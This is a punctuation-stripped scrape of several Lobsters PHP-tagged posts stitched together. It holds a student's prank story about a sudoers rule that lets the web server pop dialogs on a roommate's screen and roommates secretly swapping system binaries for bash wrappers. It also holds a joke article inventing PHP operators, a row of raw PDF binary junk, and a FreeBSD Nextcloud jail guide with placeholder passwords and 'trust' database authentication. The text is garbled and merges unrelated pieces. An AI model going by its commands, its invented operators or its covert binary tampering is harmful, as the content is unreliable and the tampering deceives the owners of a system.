randomlygenerated error message appeared home tv bothered shit logan know nothing website wondering heck many graphic card internet issue div br img srcloganjpg page number thing pick semirandom error message display pick type dialog box appear display box certain period time second render button also explanation happened accompanied fun picture logan render html head hopefully people page look like wondering webpage allows code execution fashion web server owner wwwdata could possibly execute command display user thedisplayuser probably happy know strictly limit sudoers file etcsudoers wwwdata thedisplayuser nopasswd usrbinzenity particular bit configuration allows wwwdata execute usrbinzenity thedisplayuser without password deployed squashing annoying php nginx configuration nonsense sent url couple friend campus know logan prank result thank goodness logan reacted strongly mildly irritated would peeved effort nothing lost cool count many reboots driver reinstallations kernel modification wish filmed angry got opening vlc someone apartment popped bunch window graphic card error got amused chris another roommate decided pranker pranked step noticed one day logan asleep error message said max behind showed reversepranked investigated found somebody chris edited message zenityphp chosen random promptly removed logan figure prank yet assumed fun step week later messaged popped assumed chris noticed decided readd list nope carefully checking file noticed calling usrsbinzenity instead usrbinzenity system default accompanying entry sudoers file allow usrsbinzenity shell script binbash echo tmplogtxt eq random usrbinzenity error text max responsible timeout devnull else usrbinzenity fi well nextlevel shit ever seen ninety nine percent time right thing one percent display max responsible deleted file mistake know sudoers entry changed zenityphp way message stopped appearing came back step checked zenityphp nothing new usrsbinzenity gone color confused decided peek usrbinzenity binbash binary junk binary junk binary junk binary junk binary junk eq random usrbinrpmdbclient error text x r e p n b l e f r h e e timeout devnull else usrbinrpmdbclient fi crafty little fucker edited zenity binary directly bash script work time hell even rpmdbclient fought back modified snip eq random usrsbinrpmdbclient error text x r e p n b l e f r h e e timeout devnull else usrbinrpmdbclient fi see difference first one call usrsbinrpmdbclient instead usrbinrpmdbclient made sbin variant noop bash script luck notice onecharacter change message would never display todo figure difference elf executable usrsbinzenity usrbinrpmdbclient created chris strange binary difference understand yet step decided fight back chris found oneletter differential described reverted change decided make patch zenity instead major prop tom hebb like every technical post write helping configure apt download source package case adding debsrc line etcaptsourceslist aptget source zenity make patch using quilt quilt new mypatchdiff patch srcmsgc detect word max max used message text index author glynn foster glynnfoster suncom include stringh include configh include zenityh zenitymsg zenitydata data zenitymsgd gobject text gobject image strstr msgdata dialogtext max strstr msgdata dialogtext max return switch msgdata mode case zenitymsgwarning builder zenityutilloaduifile zenitywarningdialog null quilt add srcmsgc quilt pop dpkgsource commit dpkgbuildpackage u uc realize creating installing new package noticeable silently replacing binary silently replace rpmdbclient zenity binary compiled version zenity pat back patch change zenity notice message contains text max max quietly nothing update far end march chris noticed modified binary logan also therefore noticed message include name yet end sight prank unless decide tell graduate update graduated parted way though logan living together next year likely house enough carry prank decided publish post attempting shenanigan
121,Lobsters,php,PHP programming,PHP Tek 2018 has begun!,https://dev.to/matt24ray/php-tek-2018-has-begun-50cb,php tek begun,php tek chris hartjes grumpy programmer margaret staple list,day begun php tek able attend training session unit testing given chris hartjes chris known grumpy programmer gave solid intro unit testing php dove deeper topic like data provider double first talk conference solid talk community margaret staple heard good bit talk community dev world nice hear practical expectation example community landscape thanks margaret inviting everyone go see deadpool even initial invite followed another reach see anyone else could make enjoying lovely talk biometrics adam englander adam detailed history current trend biometrics made feel little bit better saying majority u world highvalue target first step change password something list
122,Lobsters,php,PHP programming,Weird operators in PHP,https://www.exakat.io/weird-operators-in-php/,weird operator php,weird operator php operator xor b operator operator left object operator operator left arrow array b constant name battleship operator tiny spaceship xfighters battleship operator death star php operator madness audit code,weird operator php weird operator php read php documentation learn ton operator learnt php operator go first wait operator usually made strange symbol like really plain readable like merely missed attempt readable actually hide double personnality like xor probably think know php documentation always learn dove deep core php code looked special php operator lesser known useful daily coding php operator know b operator simply add b string nothing neat trick work b b nothing else remind u fate php since b look like string bcontent operator short array append operator work expect pushing element right side array left array element indeed lot elegant array element benchmark tends show lot faster benchmark show lot slower usual check applies betting performance trick sadly word great tool manual left object operator left object operator introduced php extend way writing code coder could write php right left although project later discontinued obscure reason first operator supported left php c b backward compatibility purpose code reach property b object simply compare opposite b operator also known super object operator built top remote cousin object property work like except main catch use object object variable rather integer left arrow array b know operator array array also support mirror version like array b c convenient young coder older one still mirrorwriting operator also ability turn operand boolean compact storage constant name constant nice efficient want freedom syntax although manual state constant letter underscore figure also authorized use special character like name like x foo b preparation make sure constant b exist product value intended constant another good reason avoid prime number constant value battleship operator since php introduced everyone know spaceship operator le know whole fleet spaceship introduced time offer large fleet scale operation tiny spaceship may provide escort spaceship operator using tiny spaceship operator operator comparison simply add b lot style b xfighters case want add firepower previous fleet summon xfighters php source following code add battleship operator battleship operator provides support previous operator one array operator like used advanced php guru ever side galaxy underestimate power x b much better way write x b death star many asked death star operator builtin php answer currently unknown plan one ever seen actual instance would love see threeline wide operator php would first thing happens hopefully credited worth operator ever x true php operator madness php operator neat efficient hope lesser known operator taught thing two php check provided code work php code except death star may prerequisite make sure read doc using manage use refer u manager want make audit code
123,Lobsters,php,PHP programming,References in PHP: An Indepth Look,https://derickrethans.nl/talks/phparch-php-variables-article.pdf,reference php indepth look,,obj endobj xref n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n trailer startxref eof obj stream c g x ā b r f f c x endstream endobj obj endobj obj encoding endobj obj endobj obj hnborder typeannot endobj obj hnborder typeannot endobj obj font procset pdftextimagebimagec extgstate endobj obj endobj obj endobj obj stream ru endstream endobj obj stream r k endstream endobj obj endobj obj endobj obj endobj obj endobj obj endobj obj stream p sg h fp xr c ti ϳ ũ yd ca x g f e wl au czt p endstream endobj obj stream h b endstream endobj obj stream gz wbrx zgе mc endstream endobj obj endobj obj endobj obj stream p ixoc f r ϕ e hx e f orʓ r c ܠ r ngj k ssg v į ߐ ae e e w endstream endobj obj endobj obj endobj obj stream hu x b u vwly z nħ j ւȴ k mw g sr e ҽb g yb r cni v endstream endobj obj endobj obj endobj obj endobj obj endobj obj endobj obj stream ap
124,Lobsters,php,PHP programming,How to deploy Laravel to Kubernetes,https://learnk8s.io/blog/deploying-laravel-to-kubernetes,deploy laravel kubernetes,click redirected,redirected
125,Lobsters,php,PHP programming,Nextcloud 13 on FreeBSD,https://vermaden.wordpress.com/2018/04/04/nextcloud-13-on-freebsd/,nextcloud freebsd,host cat etcsysctlconf eof allow jail raw socket allow upgrade jail eof sysctl sysctl cat bootloaderconf eof racctrctl resource limit eof mb path desc host command nextcloudlocal command jls p axwww cpu r time command j nextcloud jail zfs create mountpointjail localjail zfs create mountpointjailnextcloud localjailnextcloud zfs create mountpointjailnextcloudvardbpostgresdata localjailnextcloudpgsql zfs get r recordsize localjail cd jailnextcloud fetch http tar unlink xpjf c jailnextcloud l jailnextcloud cat etcjailconf eof nextcloud hosthostname nextcloudlocal interface path jailnextcloud execstart binsh etcrc execstop binsh etcrcshutdown execclean mountdevfs allowrawsockets allowsysvipc eof jls cat etcrcconf eof jail jailenableyes eof service jail start nextcloud jls cat etchosts eof nextcloud nextcloudlocal nextcloud eof jexec bincsh cat etchosts eof nextcloud nextcloudlocal nextcloud eof jexec bincsh newaliases v cp usrsharezoneinfoeuropewarsaw etclocaltime cat etcrcconf eof daemon yes syslogdflags sshdenableyes phpfpmenableyes postgresqlenableyes postgresqlclasspostgres postgresqldatavardbpostgresdata memcachedenableyes memcachedflags l nginxenableyes daemon sendmailenablenone sendmailsubmitenableno sendmailoutboundenableno sendmailmspqueueenableno cleartmpenableyes cleartmpxyes extranetfstypesnfs dumpdevno updatemotdno keyratefast eof cat etccrondsendmailcleanclientmqueue eof clean sendmail root binrm r f varspoolclientmqueue eof exit service jail restart nextcloud jls jexec nextcloud bincsh sockstat package echo nameserver etcresolvconf ping c freebsdorg grep quarterly etcpkgfreebsdconf sed squarterlylatestg etcpkgfreebsdconf grep latest etcpkgfreebsdconf pkg update f portsnap fetch extract portsnap fetch update cd usrportswwwnextcloud make rundependslist grep php make rundependslist grep database grep e az default usrportsmkbsddefaultversionsmk column cat etcmakeconf eof wrkdirprefix portsdir obj defaultversions defaultversions optionsunset mysql optionsset pgsql eof make showconfig make config make showconfig cat vardbportswwwnextcloudoptions make c usrportswwwnextcloud rundependslist grep php make c usrportswwwnextcloud rundependslist grep sql exit jexec nextcloud binsh make c usrportswwwnextcloud rundependslist read echo pkg install basename done pkg install peclsmbclient pkg search peclsmbclient pkg install gettextruntime pkg install pkg install peclsmbclient pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install nginx pkg install memcached pkg install portmaster pkg install sudo pkg install pkg install pkg install pkg install portmaster wwwnextcloud mailcclient portmaster wwwnextcloud wwwnginx databasesmemcached securitysudo mailcclient pkg info grep e phpnginxmemcachedpostgresqlsudonextcloudportmaster postgresql database cat etcloginconf eof postgres setenvlccollatec tcdefault eof grep postgres etcloginconf capmkdb etcloginconf chown postgres postgres vardbpostgresdata cat etcrcconf usrlocaletcrcdpostgresql initdb usrlocaletcrcdpostgresql start sockstat psql h nextcloudlocal u postgres grep c vardbpostgresdatapghbaconf usrlocaletcrcdpostgresql restart psql h nextcloudlocal u postgres create user nextcloud password nextclouddbpassword create database nextcloud template encoding unicode alter database nextcloud owner nextcloud q cat vardbpostgresdatavacuumsh devnull usrlocalbinreindexdb devnull devnull usrlocalbinreindexdb devnull devnull eof chmod x vardbpostgresdatavacuumsh chown postgres postgres vardbpostgresdatavacuumsh su postgres c crontab e su postgres c crontab l nginx webserver mkdir p usrlocaletcnginxssl cd usrlocaletcnginxssl openssl req node day newkey keyout nginxkey nginxcrt nextcloudserverpassword pl lodzkie lodz vermaden enterprise ltd nextcloud departament nextcloudlocal vermaden nextcloudcom chmod usrlocaletcnginxsslnginxkey l l usrlocaletcnginxssl l l varlog grep nginx chown r www www varlognginx l l varlog grep nginx cat usrlocaletcnginxnginxconf php cat cat eof postgressql pgsqlallowpersistent pgsqlautoresetpersistent pgsqlmaxpersistent pgsqlmaxlinks pgsqlignorenotice pgsqllognotice eof cat cat cat eof postgressql pgsqlallowpersistent pgsqlautoresetpersistent pgsqlmaxpersistent pgsqlmaxlinks pgsqlignorenotice pgsqllognotice eof cat varlogphpfpmlog chown www www varlogphpfpmlog grep usrlocaletcphpfpmconf cat usrlocaletcphpfpmdwwwconf cat usrlocaletcphpini daemon cat etcrcconf usrlocaletcrcdmemcached start usrlocaletcrcdphpfpm start usrlocaletcrcdpostgresql status usrlocaletcrcdnginx start sockstat l l varrunphpfpmsock nextcloud mkdir p vardbnextclouddata chown r www www vardbnextcloud chown r www www usrlocalwwwnextcloud http nextcloudlocal admin nextcloudadminpassword vardbnextclouddata nextcloud nextclouddbpassword nextcloud nextcloudlocal finish setup diff u configphporg configphp cat usrlocalwwwnextcloudconfigconfigphp sudo u www php usrlocalwwwnextcloudocc config list system log cat etcnewsyslogconf eof vardbnextclouddatanextcloudlog www www jc varlogphpfpmlog www www jc varlognginxerrorlog www www jc varlognginxaccesslog www www jc eof newsyslog v tail cleanup optional rm rf varcachepkg rm rf usrportsobj rm rf usrportsdistfiles pkg autoremove update sysv ipc jail man jail allowsysvipc sysvmsg sysvsem sysvshm inherit postgres freebsd jail http etcjailconf diff u etcjailconfold etcjailconf cat etcjailconf update setup without socket diff u usrlocaletcphpfpmdwwwconfsocket usrlocaletcphpfpmdwwwconf diff u usrlocaletcnginxnginxconfsocket usrlocaletcnginxnginxconf update nextcloud update su www c php usrlocalwwwnextcloudocc config import usrlocalsharenextcloudfixappspathsjson update nextcloud freebsd bsd zfs user conf like,today would like share setup nextcloud running freebsd system make thing interesting would running inside freebsd jail describe nextcloud setup large enough several blog post official nextcloud documentation recommends following setup mysqlmariadb php newer apache modphp prefer postgresql database mysqlmariadb prefer fast lean nginx web server apache setup based component postgresql php nginx phpfpm memcached memcached subsystem least important easily changed something modern like redis example prefer use third party tool freebsd jail management bad something like many choice good freebsd jail management want provide generic example nextcloud jail specific management tool host let start preparing freebsd host needed setting need allow using raw socket jail future optional upgrade jail also allow using chflags jail host cat etcsysctlconf eof allow jail raw socket allow upgrade jail eof host sysctl securityjailallowrawsockets host sysctl securityjailchflagsallowed would also enable rctl limit convenient resource limitation host system host cat bootloaderconf eof racctrctl resource limit eof complete jail finished installation take le size mb remove needed part installation finished complete freebsd port tree current portsnap information take gb space mb path desc jailnextcloud complete nextcloud jail jailnextcloudusrports removed install jailnextcloudvardbportsnap removed install used laptop jail host jail configured use wireless interface address distinguish command type host system nextcloudlocal jail use two different prompt way obvious command execute command host system host command command nextcloudlocal jail root nextcloud command running jail process host jls jid ip address hostname path nextcloudlocal jailnextcloud host p axwww cpu r time command j nextcloud cpu r time command usrsbinsyslogd usrsbinsshd usrsbincron postgres checkpointer process postgres postgres writer process postgres postgres wal writer process postgres postgres autovacuum launcher process postgres postgres stats collector process postgres postgres bgworker logical replication launcher postgres usrlocalbinpostgres vardbpostgresdata nginx master process usrlocalsbinnginx nginx worker process nginx nginx worker process nginx nginx worker process nginx nginx worker process nginx usrlocalbinmemcached l p varrunmemcachedmemcachedpid phpfpm master process usrlocaletcphpfpmconf phpfpm phpfpm pool www phpfpm phpfpm pool www phpfpm phpfpm pool www phpfpm phpfpm pool www phpfpm jail first prepare jail nextcloud installation let create zfs datasets purpose use local zfs pool also create zfs dataset postgresql data record size host zfs create mountpointjail localjail host zfs create mountpointjailnextcloud localjailnextcloud host zfs create mountpointjailnextcloudvardbpostgresdata localjailnextcloudpgsql host zfs get r recordsize localjail name property value source localjail recordsize default localjailnextcloud recordsize default localjailnextcloudpgsql recordsize local let fetch freebsd base jailnextcloud path host cd jailnextcloud host fetch http tar unlink xpjf c jailnextcloud mb kbps host l jailnextcloud cshrc bin copyright etc libexec mnt proc root sys usr profile boot dev lib medium net rescue sbin tmp var base freebsd jail fetched jailnextcloud path let configure host jail one jail configured simplicity nextcloudlocal jail host cat etcjailconf eof nextcloud hosthostname nextcloudlocal interface path jailnextcloud execstart binsh etcrc execstop binsh etcrcshutdown execclean mountdevfs allowrawsockets allowsysvipc eof creatingmodifying etcjailconf file running jail host jls jid ip address hostname path let enable jail host system host cat etcrcconf eof jail jailenableyes eof start nextcloudlocal jail first time host service jail start nextcloud starting jail nextcloud host jls jid ip address hostname path nextcloudlocal jailnextcloud let configure nextcloudlocal name host jail host cat etchosts eof nextcloud nextcloudlocal nextcloud eof host jexec bincsh root nextcloud cat etchosts eof nextcloud nextcloudlocal nextcloud eof one remember localhost freebsd jail jail configure ip address listening purpose example important configure service host listen localhost work usual freebsd jail able connect even jail let make basic configuration nextcloud jail host jexec bincsh root nextcloud newaliases v warning local host name nextcloud qualified see cfreadme etcmailaliases alias longest byte byte total root nextcloud cp usrsharezoneinfoeuropewarsaw etclocaltime let create basic etcrcconf file jail leave service commented yet configured run want imitate debian start service default configs root nextcloud cat etcrcconf eof daemon yes syslogdflags sshdenableyes phpfpmenableyes postgresqlenableyes postgresqlclasspostgres postgresqldatavardbpostgresdata memcachedenableyes memcachedflags l nginxenableyes daemon sendmailenablenone sendmailsubmitenableno sendmailoutboundenableno sendmailmspqueueenableno cleartmpenableyes cleartmpxyes extranetfstypesnfs dumpdevno updatemotdno keyratefast eof disable sendmail need make sure varspoolclientmqueue would fill time let configure simple cron job root nextcloud cat etccrondsendmailcleanclientmqueue eof clean sendmail root binrm r f varspoolclientmqueue eof basic configuration let restart jail root nextcloud exit host service jail restart nextcloud stopping jail nextcloud starting jail nextcloud host jls jid ip address hostname path nextcloudlocal jailnextcloud host jexec nextcloud bincsh restart sshd daemon listening connection root nextcloud sockstat user command pid fd proto local address foreign address root sshd package let configure network connectivity jail needed get package internet root nextcloud echo nameserver etcresolvconf root nextcloud ping c freebsdorg ping freebsdorg data byte byte m byte m byte m freebsdorg ping statistic packet transmitted packet received packet loss roundtrip minavgmaxstddev m want latest package let set pkg repository config file root nextcloud grep quarterly etcpkgfreebsdconf url pkghttp pkgfreebsdorg abi quarterly root nextcloud sed squarterlylatestg etcpkgfreebsdconf root nextcloud grep latest etcpkgfreebsdconf url pkghttp pkgfreebsdorg abi latest let setup pkg fetch latest repository metadata root nextcloud pkg update f package management tool yet installed system want fetch install yn bootstrapping pkg pkghttp please wait verifying signature trusted certificate done nextcloud installing nextcloud extracting updating freebsd repository catalogue pkg repository freebsd load error access repo file vardbpkgrepofreebsdsqlite failed file directory nextcloud fetching metatxz b nextcloud fetching packagesitetxz mib processing entry freebsd repository update completed package processed repository date date freebsd port tree root nextcloud portsnap fetch extract looking portsnapfreebsdorg mirror mirror found fetching public key done fetching snapshot tag done fetching snapshot metadata done fetching snapshot generated mon apr cest mb kbps extracting snapshot done verifying snapshot integrity building new index file done root nextcloud portsnap fetch update looking portsnapfreebsdorg mirror mirror found fetching snapshot tag done port tree nt changed since last snapshot update needed port tree already date default nextcloud package repository built mysql older php thus use package everything automated compilation unavoidable root nextcloud cd usrportswwwnextcloud root nextcloud usrportswwwnextcloud make rundependslist grep php root nextcloud usrportswwwnextcloud make rundependslist grep database let check freebsd port default package version root nextcloud grep e az default usrportsmkbsddefaultversionsmk column apachedefault bdbdefault firebirddefault fortrandefault gfortran fpcdefault gccdefault ghostscriptdefault agpl lazarusdefault linuxdefault linuxdefault luadefault mysqldefault pgsqldefault phpdefault pythondefault rubydefault sambadefault ssldefault base ssldefault opensslinstalled ssldefault base tcltkdefault varnishdefault postgresql php override etcmakeconf file following setting also force using pgsql option disable mysql option port root nextcloud cat etcmakeconf eof wrkdirprefix portsdir obj defaultversions defaultversions optionsunset mysql optionsset pgsql eof let display default nextcloud port configuration root nextcloud usrportswwwnextcloud make showconfig following configuration option available exifon image rotation support ldapon ldap protocol support smbon smb network protocol support sslon ssl protocol support database backend choose least one mysqlon mysql database support pgsqloff postgresql database support sqliteoff sqlite database support use make config modify setting postgresql support even enabled let configure nextcloud port need root nextcloud usrportswwwnextcloud make config let check current port configuration root nextcloud usrportswwwnextcloud make showconfig following configuration option available exifon image rotation support ldapon ldap protocol support smbon smb network protocol support sslon ssl protocol support database backend choose least one mysqloff mysql database support pgsqlon postgresql database support sqliteoff sqlite database support use make config modify setting good case wandered setting stored answer yes delete vardbportswwwnextcloud directory brought back default without postgresql mysql root nextcloud cat vardbportswwwnextcloudoptions file autogenerated make config option filecompleteoptionslistexif ldap smb ssl mysql pgsql sqlite optionsfilesetexif optionsfilesetldap optionsfilesetsmb optionsfilesetssl optionsfileunsetmysql optionsfilesetpgsql optionsfileunsetsqlite let check rundependslist configuration root nextcloud make c usrportswwwnextcloud rundependslist grep php root nextcloud make c usrportswwwnextcloud rundependslist grep sql better make thing little faster build everything freebsd port may add needed software package switch binsh shell purpose root nextcloud usrportswwwnextcloud exit host jexec nextcloud binsh root nextcloud make c usrportswwwnextcloud rundependslist read echo pkg install basename done pkg install gettextruntime pkg install pkg install peclsmbclient pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install pkg install list command install package let paste one one nextcloudlocal prompt package build sometimes get prefix version upstream port built peclsmbclient port good example root nextcloud pkg install peclsmbclient updating freebsd repository catalogue freebsd repository date repository date pkg package available install matching peclsmbclient found repository root nextcloud pkg search peclsmbclient smbclient wrapper extension smbclient wrapper extension smbclient wrapper extension smbclient wrapper extension complete list package need install root nextcloud pkg install gettextruntime root nextcloud pkg install root nextcloud pkg install peclsmbclient root nextcloud pkg install root nextcloud pkg install root nextcloud pkg install root nextcloud pkg install root nextcloud pkg install root nextcloud pkg install root nextcloud pkg install root nextcloud pkg install root nextcloud pkg install root nextcloud pkg install root nextcloud pkg install root nextcloud pkg install root nextcloud pkg install root nextcloud pkg install root nextcloud pkg install root nextcloud pkg install root nextcloud pkg install root nextcloud pkg install root nextcloud pkg install root nextcloud pkg install root nextcloud pkg install root nextcloud pkg install root nextcloud pkg install root nextcloud pkg install root nextcloud pkg install root nextcloud pkg install root nextcloud pkg install root nextcloud pkg install root nextcloud pkg install root nextcloud pkg install nginx root nextcloud pkg install memcached root nextcloud pkg install portmaster root nextcloud pkg install sudo root nextcloud pkg install root nextcloud pkg install root nextcloud pkg install package like remove package build postgresql version like root nextcloud pkg install updating freebsd repository catalogue freebsd repository date repository date checking integrity done conflicting conflict usrlocalbinclusterdb conflict usrlocalbinclusterdb checking integrity done conflicting following package affected checked installed package removed new package installed number package removed number package installed process require mib space proceed action yn need build rest root nextcloud portmaster wwwnextcloud mailcclient following action performed installation develgmake installation develgettexttools installation installation installation printtexinfo installation installation develautoconfwrapper installation develautoconf installation installation installation wwwnextcloud installation installation installation mailcclient installation installation installation alternatively juggle package port may build everything freebsd port tree command root nextcloud portmaster wwwnextcloud wwwnginx databasesmemcached securitysudo mailcclient whichever method choose must end package installed list contain dependency root nextcloud pkg info grep e phpnginxmemcachedpostgresqlsudonextcloudportmaster c c client library memcached server highperformance distributed memory object cache system personal cloud run server robust small www server php scripting language shared extension php ctype shared extension php curl shared extension php dom shared extension php exif shared extension php fileinfo shared extension php filter shared extension php ftp shared extension php gd shared extension php gmp shared extension php hash shared extension php iconv shared extension php imap shared extension php intl shared extension php json shared extension php ldap shared extension php mbstring shared extension php opcache shared extension php openssl shared extension php pcntl shared extension php pdo shared extension php pdopgsql shared extension php php extension interfacing memcached via libmemcached library smbclient wrapper extension pgsql shared extension php posix shared extension php session shared extension php simplexml shared extension php wddx shared extension php xml shared extension php xmlreader shared extension php xmlwriter shared extension php xsl shared extension php zip shared extension php zlib shared extension php manage port without external database language postgresql database client postgresql advanced opensource database available anywhere allow others run command root postgresql database configure postgresql database first let start freebsd login class root nextcloud cat etcloginconf eof postgres setenvlccollatec tcdefault eof root nextcloud grep postgres etcloginconf postgres setenvlccollatec tcdefault root nextcloud capmkdb etcloginconf let make sure postgresql data directory belongs postgres user root nextcloud chown postgres postgres vardbpostgresdata let enable postgresql service etcrcconf file look like root nextcloud cat etcrcconf daemon yes syslogdflags sshdenableyes postgresqlenableyes postgresqlclasspostgres postgresqldatavardbpostgresdata phpfpmenableyes memcachedenableyes memcachedflags l nginxenableyes daemon sendmailenablenone sendmailsubmitenableno sendmailoutboundenableno sendmailmspqueueenableno cleartmpenableyes cleartmpxyes extranetfstypesnfs dumpdevno updatemotdno keyratefast may initialize start database root nextcloud usrlocaletcrcdpostgresql initdb file belonging database system owned user postgres user must also server process database cluster initialized locale collate c ctype message monetary numeric time default text search configuration set english data page checksum disabled fixing permission existing directory vardbpostgresdata ok creating subdirectory ok selecting default maxconnections selecting default sharedbuffers selecting dynamic shared memory implementation posix creating configuration file ok running bootstrap script ok performing postbootstrap initialization ok syncing data disk ok warning enabling trust authentication local connection change editing pghbaconf using option authlocal authhost next time run initdb success start database server using usrlocalbinpgctl vardbpostgresdata l logfile start let start root nextcloud usrlocaletcrcdpostgresql start cest log could create socket address protocol supported cest log listening address port cest log listening unix socket cest log ending log output stderr cest hint future log output go log destination syslog root nextcloud sockstat user command pid fd proto local address foreign address postgres postgres root sshd ok working listening connection next connect create user database nextcloud server root nextcloud psql h nextcloudlocal u postgres psql fatal pghbaconf entry host user postgres database postgres ssl remmeber rule localhost jail localhost jail add address vardbpostgresdatapghbaconf file shown root nextcloud grep c vardbpostgresdatapghbaconf local connection host trust host trust let restart postgresql database root nextcloud usrlocaletcrcdpostgresql restart cest log could create socket address protocol supported cest log listening address port cest log listening unix socket cest log ending log output stderr cest hint future log output go log destination syslog connect create needed user database nextcloud installation root nextcloud psql h nextcloudlocal u postgres psql type help help postgres create user nextcloud password nextclouddbpassword create role postgres create database nextcloud template encoding unicode create database postgres alter database nextcloud owner nextcloud alter database postgres q root nextcloud also create daily maintenance script postgresql database root nextcloud cat vardbpostgresdatavacuumsh devnull usrlocalbinreindexdb devnull devnull usrlocalbinreindexdb devnull devnull eof root nextcloud chmod x vardbpostgresdatavacuumsh root nextcloud chown postgres postgres vardbpostgresdatavacuumsh let add cron job postgres user root nextcloud su postgres c crontab e line character crontab installing new crontab root nextcloud su postgres c crontab l vardbpostgresdatavacuumsh nginx webserver configure nginx let start creating self signed certificate want see warning certificate signed may want use service letsencryptorg example root nextcloud mkdir p usrlocaletcnginxssl root nextcloud cd usrlocaletcnginxssl root nextcloud usrlocaletcnginxssl openssl req node day newkey keyout nginxkey nginxcrt enter pas phrase serverkey nextcloudserverpassword asked enter information incorporated certificate request enter called distinguished name dn quite field leave blank field default value enter field left blank country name letter code au pl state province name full name somestate lodzkie locality name eg city lodz organization name eg company internet widgits pty ltd vermaden enterprise ltd organizational unit name eg section nextcloud departament common name eg server fqdn name nextcloudlocal email address vermaden nextcloudcom root nextcloud chmod usrlocaletcnginxsslnginxkey root nextcloud l l usrlocaletcnginxssl total rwr r root wheel apr nginxcrt rw root wheel apr nginxkey let tak care right nginx log file root nextcloud l l varlog grep nginx drwxrxrx root wheel apr nginx root nextcloud chown r www www varlognginx root nextcloud l l varlog grep nginx drwxrxrx www www apr nginx last least nginx main configuration file root nextcloud cat usrlocaletcnginxnginxconf user www workerprocesses workerrlimitnofile errorlog varlognginxerrorlog event workerconnections http include mimetypes defaulttype applicationoctetstream logformat main remoteaddr remoteuser timelocal request accesslog varlognginxaccesslog main sendfile keepalivetimeout upstream phphandler server unix varrunphpfpmsock server enforce http listen servername nextcloudlocal return http servername requesturi server listen ssl servername nextcloudlocal sslcertificate usrlocaletcnginxsslnginxcrt sslcertificatekey usrlocaletcnginxsslnginxkey header security related addheader stricttransportsecurity includesubdomains preload header addheader xcontenttypeoptions nosniff addheader xxssprotection modeblock addheader xrobotstag none addheader xdownloadoptions noopen addheader xpermittedcrossdomainpolicies none path root installation root usrlocalwwwnextcloud location robotstxt allow lognotfound accesslog location wellknowncarddav return scheme hostremotephpdav location wellknowncaldav return scheme hostremotephpdav buffer timeouts upload size clientmaxbodysize clientbodybuffersize sendtimeout enable gzip remove etag header gzip gzipvary gzipcomplevel gzipminlength gzipproxied expired nocache nostore private nolastmodified noetag auth gziptypes applicationatomxml applicationjavascript applicationjson applicationldjson applicationmanifestjson applicationrssxml applicationvndgeojson applicationvndmsfontobject applicationxfontttf applicationxwebappmanifestjson applicationxhtmlxml applicationxml fontopentype imagebmp imagesvgxml imagexicon textcachemanifest textcss textplain textvcard textvndrimlocationxloc textvtt textxcomponent textxcrossdomainpolicy location rewrite indexphp uri location deny location autotestoccissueindiedbconsole deny location indexremotepubliccroncoreajaxupdatestatusocsv updaterocsprovider php fastcgisplitpathinfo php include fastcgiparams fastcgiparam scriptfilename documentroot fastcgiscriptname fastcgiparam pathinfo fastcgipathinfo fastcgiparam http fastcgiparam modheadersavailable true fastcgiparam frontcontrolleractive true fastcgipass phphandler fastcgiintercepterrors fastcgirequestbuffering fastcgikeepconn fastcgibuffers fastcgibuffersize fastcgibusybufferssize fastcgitempfilewritesize fastcgisendtimeout fastcgireadtimeout fastcgiconnecttimeout location updaterocsprovider tryfiles uri index indexphp adding cache control header j cs file make sure php block location cssjswoffsvggif tryfiles uri indexphp uri isargs args addheader cachecontrol public header security related intended duplicated one addheader stricttransportsecurity includesubdomains preload header addheader xcontenttypeoptions nosniff addheader xxssprotection modeblock addheader xrobotstag none addheader xdownloadoptions noopen addheader xpermittedcrossdomainpolicies none optional dont log access asset accesslog location pnghtmlttficojpgjpeg tryfiles uri indexphp uri isargs args optional dont log access asset accesslog point later would get following error browser problem nginx php phpfpm configuration bad gateway php configure php need first postgresql related setting root nextcloud cat extensionpgsqlso root nextcloud cat eof postgressql pgsqlallowpersistent pgsqlautoresetpersistent pgsqlmaxpersistent pgsqlmaxlinks pgsqlignorenotice pgsqllognotice eof root nextcloud cat extensionpgsqlso postgressql pgsqlallowpersistent pgsqlautoresetpersistent pgsqlmaxpersistent pgsqlmaxlinks pgsqlignorenotice pgsqllognotice root nextcloud cat extensionpdopgsqlso root nextcloud cat eof postgressql pgsqlallowpersistent pgsqlautoresetpersistent pgsqlmaxpersistent pgsqlmaxlinks pgsqlignorenotice pgsqllognotice eof root nextcloud cat extensionpdopgsqlso postgressql pgsqlallowpersistent pgsqlautoresetpersistent pgsqlmaxpersistent pgsqlmaxlinks pgsqlignorenotice pgsqllognotice let make sure phpfpm log file exists right owner root nextcloud varlogphpfpmlog root nextcloud chown www www varlogphpfpmlog modification needed usrlocaletcphpfpmconf file root nextcloud grep usrlocaletcphpfpmconf global pid runphpfpmpid includeusrlocaletcphpfpmd conf let create www profile phpfpm daemon root nextcloud cat usrlocaletcphpfpmdwwwconf www user www group www listen varrunphpfpmsock listenbacklog listenowner www listengroup www pm static pmmaxchildren pmstartservers pmminspareservers pmmaxspareservers pmprocessidletimeout pmmaxrequests requestterminatetimeout rlimitfiles env hostname hostname env path usrlocalbin usrbin bin env tmp tmp env tmpdir tmp env temp tmp main php usrlocaletcphpini configuration file root nextcloud cat usrlocaletcphpini php engine shortopentag precision outputbuffering zliboutputcompression implicitflush unserializecallbackfunc serializeprecision disablefunctions disableclasses zendenablegc exposephp maxexecutiontime maxinputtime memorylimit errorreporting eall edeprecated estrict displayerrors displaystartuperrors logerrors logerrorsmaxlen ignorerepeatederrors ignorerepeatedsource reportmemleaks trackerrors htmlerrors errorlog varlogphplog variablesorder gpcs requestorder gp registerargcargv autoglobalsjit postmaxsize autoprependfile autoappendfile defaultmimetype texthtml defaultcharset docroot userdir enabledl fileuploads uploadmaxfilesize maxfileuploads allowurlfopen allowurlinclude defaultsockettimeout cli server cliservercolor date datetimezone europewarsaw filter iconv intl pcre pdo pdomysql pdomysqlcachesize pdomysqldefaultsocket phar mail function smtp localhost smtpport mailaddxheader sql sqlsafemode odbc odbcallowpersistent odbccheckpersistent odbcmaxpersistent odbcmaxlinks 